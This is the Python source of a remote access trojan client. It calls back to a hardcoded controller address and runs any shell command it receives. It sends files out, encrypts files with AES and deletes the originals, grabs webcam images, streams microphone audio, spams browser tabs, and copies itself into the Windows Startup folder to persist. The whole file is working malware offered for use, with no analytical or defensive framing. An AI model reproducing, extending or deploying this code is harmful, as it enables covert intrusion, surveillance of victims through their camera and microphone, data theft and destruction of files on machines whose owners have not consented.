import os
import socket
from time import sleep
from random import randint
from getpass import getuser
from shutil import copyfile
from platform import system
from cv2 import VideoCapture
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from webbrowser import open_new
from subprocess import PIPE, Popen
from pyaudio import paInt16, PyAudio


def socket_create():
    """
    The function creates socket (allows two computers to connect)


    :return: None
    """
    try:
        global host
        global port
        global s
        host = '192.168.1.223'
        # host = '10.0.0.19'
        # host = get_lan_ip()
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_connect():
    """
    The function connects to a remote socket


    :return: None
    """
    try:
        global host
        global port
        global s
        # print('Binding socket to port: ' + str(port))
        s.connect((host, port))
    except socket.error as msg:
        print('Socket connection error: ' + str(msg))
        sleep(5)
        socket_connect()


def send_file(file_path):
    """
    The function sends a file to the server

    :param file_path: The path of the file we want to send
    :type file_path: str

    :return: None
    """
    f = open(str(file_path), 'rb')
    print 'Sending...'
    file_conn = f.read(20480)
    while file_conn:
        print 'Sending...'
        s.send(file_conn)
        file_conn = f.read(20480)
    f.close()
    print "Done Sending"
    output_str = "The file was sent" + "\n"
    s.send(str.encode(output_str + str(os.getcwd()) + '> '))


def receive_commands():
    """
    The function receives commands from the socket
    and executes them

    :return: None
    """
    while True:
        data = s.recv(20480)
        command = data.decode("utf-8")
        command_with_data = command.split()
        # Enter a directory
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        # Quit the direct connection and letting the server connect to
        # another computer
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        # Show the server the computer is actually connected
        if data.decode("utf-8") == 'list':
            output_str = "Command not recognized" + "\n"
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        # The rest of the commands
        elif len(data) > 0:
            # File transfer
            if data[:8].decode("utf-8") == 'transfer':
                file_name = data[9:].decode("utf-8")
                file_path = str(os.getcwd()) + chr(92) + file_name
                # Checks if the file exists
                if not os.path.exists(file_path):
                    output_str = "The file does not exist" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                else:
                    try:
                        # Tries to send the file to the server
                        send_file(file_path)
                    except:
                        output_str = "Could not transfer the file" + "\n"
                        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                        print(output_str)

            # File encryption
            elif command_with_data[0] == 'encrypt':
                file_name = command_with_data[1]
                file_path = str(os.getcwd()) + chr(92) + file_name
                password = command_with_data[2]
                try:
                    # Tries to encrypt the file using our function
                    encrypt(get_key(password), file_name, file_path)
                    output_str = "File encrypted" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not encrypt the file" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
            # File decryption
            elif command_with_data[0] == 'decrypt':
                file_name = command_with_data[1]
                file_path = str(os.getcwd()) + chr(92) + file_name
                password = command_with_data[2]
                try:
                    decrypt(get_key(password), file_name, file_path)
                    output_str = "File decrypted" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not decrypt the file" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
            # Open tabs in chrome
            elif (command_with_data[0] == 'open' and
                  command_with_data[1] == 'chrome'):
                try:
                    amount_of_windows = int(command_with_data[3])
                    url_to_open = command_with_data[2]
                    open_chrome(url_to_open, amount_of_windows)
                    output_str = str(
                        amount_of_windows) + " windows were opened" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not open the windows" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
            # Take a photo using the computer's camera
            elif data.decode("utf-8").__contains__('show camera'):
                video = VideoCapture(0)
                check, frame = video.read()
                flattened_frame = frame.flatten()
                string_flattened_frame = flattened_frame.tostring()
                s.send(string_flattened_frame)
            # Record audio through the computer's microphone
            elif data.decode("utf-8").__contains__('record audio'):
                send_audio()

            else:
                try:
                    cmd = Popen(data[:].decode("utf-8"), shell=True,
                                stdout=PIPE,
                                stderr=PIPE,
                                stdin=PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes)
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print output_str
                except:
                    output_str = "Command not recognized" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
    s.close()


def get_key(password):
    """
    The program gets a password and coverts it to something we can use
    to encrypt

    :param password: The users picked password
    :type password: str

    :return: a password we can use in encryption
    """
    hasher = SHA256.new(password).digest()
    return hasher


def encrypt(key, filename, file_path):
    """
    The function encrypts the file given

    :param key: The encryption key
    :type key: str

    :param filename: The name of the file to encrypt
    :type filename: str

    :param file_path: The path of the file to encrypt
    :type file_path: str

    :return: None
    """
    chunk_size = 64 * 1024
    output_file = str(os.getcwd()) + chr(92) + "(encrypted)" + filename
    file_size = str(os.path.getsize(file_path)).zfill(16)
    iv = ""

    for i in range(16):
        iv += chr(randint(0, 0xFF))
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as infile:
        with open(output_file, 'wb') as output_file:
            output_file.write(file_size)
            output_file.write(iv)

            while True:
                chunk = infile.read(chunk_size)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))

                output_file.write(encryptor.encrypt(chunk))
    os.remove(file_path)


def decrypt(key, filename, file_path):
    """
    The function decrypts the file given

    :param key: The decryption key
    :type key: str

    :param filename: The name of the file to encrypt
    :type filename: str

    :param file_path: The path of the file to encrypt
    :type file_path: str

    :return: None
    """
    chunk_size = 64 * 1024
    output_file = str(os.getcwd()) + chr(92) + filename[11:]

    with open(file_path, 'rb') as infile:
        file_size = long(infile.read(16))
        iv = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, iv)
        with open(output_file, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(file_size)
    os.remove(file_path)


def send_audio():
    """
    The function sends recorded audio from the computers mic to server computer

    :return: None
    """
    chunk = 1024
    audio_format = paInt16
    channels = 1
    rate = 44100
    record_seconds = 40000

    p = PyAudio()
    stream = p.open(format=audio_format,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk)
    print 'Recording...'

    frames = []

    for i in range(0, int(rate / chunk + record_seconds)):
        data = stream.read(chunk)
        frames.append(data)
        s.sendall(data)

    print '*Done recording*'

    stream.stop_stream()
    stream.close()
    p.terminate()

    output_str = "The file was sent" + "\n"
    s.send(str.encode(output_str + str(os.getcwd()) + '> '))


def add_to_startup():
    """
    If the operation system is Windows, the program copy's itself
    to the startup folder

    :return: None
    """
    # Checks if the operation system is Windows
    if str(system()).__contains__('Windows'):
        # If it is Windows, it takes the programs exe file,
        # and copy's it to the Windows startup folder
        startup_folder = 'C:\Users\{0}\AppData\Roaming\Microsoft\Windows\
        Start Menu\Programs\Startup'.format(getuser())
        current_file = str(os.getcwd()) + '\Client.exe'
        if os.path.isfile(current_file):
            # If it finds the exe file, and it's not a debug from the local
            # host, it copy's it.
            copyfile(current_file, startup_folder)
        else:
            pass
    else:
        pass


def open_chrome(url, amount_tabs_to_open):
    """
    The function opens a tab in Chrome a curtain amount of times given
    by the server

    :param url: The url the server tries to open
    :type url: str

    :param amount_tabs_to_open: The amount of times to open the page
    :type amount_tabs_to_open: int

    :return: None
    """
    for x in range(0, amount_tabs_to_open):
        open_new(url)
        # In order to open all the windows in the right form
        # we have to delay the command
        sleep(0.3)


def main():
    global s
    try:
        add_to_startup()
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        sleep(5)
    s.close()
    main()


if __name__ == '__main__':
    main()
